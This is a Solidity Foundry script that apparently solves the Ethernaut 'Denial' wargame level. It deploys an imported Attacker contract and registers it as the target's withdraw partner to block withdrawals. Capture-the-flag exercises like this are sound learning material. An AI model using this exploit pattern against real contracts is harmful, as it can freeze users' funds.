// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/20-Denial/Attacker.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function owner() external view returns (address);
}

contract DeployAttack is Script {
    address private constant TARGET_ADDRESS = 0xce8d610F492a52030e2A1A848a5f2901cEadEffC;
    IDenial target; 
    
    function run() public {
        target = IDenial(TARGET_ADDRESS);
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(pk);
        
        vm.startBroadcast(pk);
        Attacker attackerContract = new Attacker();
        target.setWithdrawPartner(address(attackerContract));
        vm.stopBroadcast();
    }
    
}